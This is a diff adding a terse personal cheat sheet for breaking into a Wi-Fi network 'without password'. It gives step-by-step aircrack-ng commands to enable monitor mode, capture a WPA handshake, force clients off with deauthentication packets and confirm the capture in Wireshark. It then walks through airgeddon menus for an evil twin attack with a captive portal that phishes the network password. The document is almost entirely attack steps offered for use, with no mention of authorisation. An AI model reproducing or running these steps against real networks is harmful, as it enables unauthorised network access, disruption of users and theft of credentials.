@@ -1,0 +1,16 @@
+*NOTE: sometimes wlan0 is actually wlp8s0(wlan0->wlp8s0mon too)*
+
+*catch handshake(connect to the wifi without password):*
+
+1)sudo airmon-ng start wlan0      *puts device into networks monitor mode*
+2)sudo airmon-ng check kill       
+3)sudo airodump-ng wlan0mon       *lists all networks
+4)sudo airodump-ng --bssid <MAC addr> -c <channel> --write capture wlan0mon   *leave this terminal open
+*open new terminal
+5)sudo aireplay-ng --deauth 10 -a <MAC addr> -c <station> wlan0mon
+*find file of the captured handshakes(directory i which the previous command was ran)
+*check if the handshakes are successful - in wireshark filter write "eapol" - should be 4 handshakes
+
+6)*open aireggedon
+
+7)monitor mode -> evil twin menu(7) -> attack with captive portal(9) -> *enter, enter* ->find target network ->deauth/disassoc(1) -> *y, y,* ->specify path to captured handshake(5th step)
